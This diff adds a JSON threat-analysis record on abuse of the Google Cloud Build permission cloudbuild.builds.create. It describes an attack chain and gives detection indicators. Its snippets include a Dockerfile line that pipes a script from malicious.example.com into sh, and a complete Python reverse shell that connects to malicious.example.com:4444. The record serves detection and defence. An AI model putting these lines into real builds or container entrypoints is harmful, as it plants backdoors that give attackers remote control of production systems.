@@ -1,0 +1,112 @@
+{
+  "package_info": {
+    "package_name": "Google Cloud Build (abused via cloudbuild.builds.create permission)",
+    "package_manager": "Google Cloud Platform (GCP)",
+    "package_versions": "All versions with misconfigured permissions",
+    "why_malicious": "The abuse of the cloudbuild.builds.create permission enables attackers to escalate privileges, inject unauthorized code into production container images, and compromise the software supply chain. This can result in the deployment of backdoors, data exfiltration, and denial-of-service attacks, directly impacting the integrity and security of production environments."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "CI/CD pipeline execution (build-time)",
+        "file_location": "Injected into container images via Google Cloud Build pipeline (e.g., Dockerfile or build script)",
+        "required_permissions": [
+          "cloudbuild.builds.create",
+          "artifact registry access",
+          "GKE deployment",
+          "network",
+          "filesystem"
+        ]
+      },
+      "code_snippet": "// Example: Malicious shell command injected into Dockerfile or build script\nRUN curl -fsSL http://malicious.example.com/backdoor.sh | sh",
+      "code_language": "shell",
+      "code_behavior": "During CI/CD pipeline execution (build-time), the code downloads a remote shell script from an attacker-controlled domain using curl and pipes it directly to the shell, resulting in the installation of a backdoor into the container image, which is then propagated to production environments.",
+      "malice_analysis": {
+        "why_suspicious": "The build process is leveraged to fetch and execute code from an untrusted external source, which is not part of the legitimate application or its dependencies. This introduces unreviewed code into production artifacts.",
+        "violated_expectations": "Standard build processes should only incorporate code from trusted, version-controlled repositories and should never execute remote scripts from unknown domains during the build phase.",
+        "similar_legitimate_use": "Legitimate builds may fetch dependencies from official package repositories (e.g., apt-get, pip install), but should not download and execute arbitrary scripts from external, unverified sources.",
+        "key_indicators": [
+          "Use of curl or wget to fetch scripts from non-canonical domains in build scripts",
+          "Piping output of remote script directly to shell (e.g., | sh)",
+          "Presence of external URLs in Dockerfile RUN instructions",
+          "Modification of container images outside of source control or CI policy"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "Runtime (when compromised image is launched in GKE or other production environment)",
+        "file_location": "Entrypoint or startup script inside compromised container image",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "# Example: Python backdoor in entrypoint\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"malicious.example.com\",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/sh\",\"-i\"])",
+      "code_language": "python",
+      "code_behavior": "At runtime, when the compromised container image is launched, the code establishes a TCP connection to a hardcoded attacker-controlled domain and port, redirects standard input/output/error to the socket, and spawns an interactive shell, granting the attacker remote command execution inside the production environment.",
+      "malice_analysis": {
+        "why_suspicious": "The code creates an outbound connection to an untrusted external server and provides an interactive shell to the remote party, which is a classic backdoor technique for persistent unauthorized access.",
+        "violated_expectations": "Application containers should not initiate arbitrary outbound connections to unknown domains or expose shell access to external entities. Entrypoint scripts are expected to launch the application, not provide remote shells.",
+        "similar_legitimate_use": "Remote debugging tools may open network connections, but only to trusted endpoints and with proper authentication and auditing. Hardcoded C2 domains and shell access are not legitimate.",
+        "key_indicators": [
+          "Hardcoded external IP address or domain in network connection code",
+          "Use of socket module to connect to remote host",
+          "Duplication of file descriptors (os.dup2) to redirect shell I/O",
+          "Invocation of subprocess to launch an interactive shell"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker abuses cloudbuild.builds.create permission to initiate a new build as a privileged service account.",
+      "implemented_by": [],
+      "leads_to": "Ability to modify build artifacts and inject malicious code"
+    },
+    {
+      "step": 2,
+      "action": "Malicious code is injected into container images during the build process (e.g., via Dockerfile or build script).",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Compromised images are stored in Artifact Registry"
+    },
+    {
+      "step": 3,
+      "action": "Compromised images are deployed to Google Kubernetes Engine (GKE) or other production environments.",
+      "implemented_by": [],
+      "leads_to": "Malicious code is executed in production"
+    },
+    {
+      "step": 4,
+      "action": "Backdoor code executes at runtime, establishing a remote connection for attacker control.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker gains persistent access, enabling data theft, denial-of-service, or further lateral movement"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Unexpected build jobs initiated by non-standard or unauthorized service accounts",
+      "Build scripts or Dockerfiles downloading and executing remote code from non-trusted domains",
+      "Container images exhibiting outbound connections to untrusted or hardcoded domains at runtime",
+      "Presence of reverse shell or backdoor patterns in entrypoint or startup scripts"
+    ],
+    "file_indicators": [
+      "Dockerfile or build scripts containing curl or wget commands to external, non-official domains",
+      "Entrypoint or startup scripts with socket or subprocess usage for network connections",
+      "Unusual or unauthorized modifications to images in Artifact Registry, especially outside of normal CI/CD processes"
+    ],
+    "network_indicators": [
+      "Outbound TCP connections from build or runtime environments to unknown or hardcoded IPs/domains (e.g., malicious.example.com:4444)",
+      "Connections to attacker-controlled C2 infrastructure as specified in code (e.g., malicious.example.com on port 4444)"
+    ],
+    "how_to_detect": "Monitor Cloud Build audit logs for unexpected build initiations, especially by non-standard service accounts or with escalated privileges. Scan build scripts and Dockerfiles for commands that fetch and execute remote code from non-trusted domains. Analyze container images in Artifact Registry for embedded backdoor code, such as reverse shell patterns in entrypoint scripts. Monitor runtime network activity for suspicious outbound connections to hardcoded or untrusted domains. Enforce least privilege on cloudbuild.builds.create and related permissions, and implement policy controls to restrict build-time network access."
+  }
+}
